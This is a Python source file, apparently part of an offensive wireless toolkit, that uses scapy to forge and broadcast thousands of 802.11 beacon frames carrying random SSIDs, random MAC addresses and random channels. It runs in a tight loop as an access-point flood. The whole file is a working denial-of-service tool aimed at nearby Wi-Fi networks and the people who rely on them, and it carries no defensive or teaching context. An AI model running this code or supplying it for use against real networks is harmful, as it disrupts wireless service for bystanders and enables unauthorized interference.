# core/WIFI/ap_flood.py
import random
import string
import threading
import time

from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp

from debugs import debug


def access_point_flood(interface, count=200):
    noise_chars = string.punctuation
    supported_rates = b'\x82\x84\x8b\x96'
    debug("info", f"Starting AP flood on {interface} with APs...")
    debug("info", "AP Flood Running... Press Ctrl+C to stop.")

    stop = threading.Event()

    def _build_batch():
        batch = []
        for _ in range(count):
            ssid = ''.join(random.choice(noise_chars)
                           for _ in range(random.randint(12, 24)))
            mac = ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))
            channel = random.randint(1, 11)
            batch.append(
                RadioTap() /
                Dot11(type=0, subtype=8,
                      addr1="FF:FF:FF:FF:FF:FF",
                      addr2=mac, addr3=mac) /
                Dot11Beacon(cap=0x0411) /
                Dot11Elt(ID="SSID", info=ssid.encode('utf-8')) /
                Dot11Elt(ID="Rates", info=supported_rates) /
                Dot11Elt(ID="DSset", info=bytes([channel]))
            )
        return batch

    try:
        while not stop.is_set():
            packet_batch = _build_batch()
            try:
                sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
                sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
                sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
            except KeyboardInterrupt:
                debug("info", "AP flood interrupted by user")
                return
            time.sleep(0.0005)
    except KeyboardInterrupt:
        debug("info", "AP flood interrupted by user")
        return
    finally:
        debug("info", "AP flood stopped.")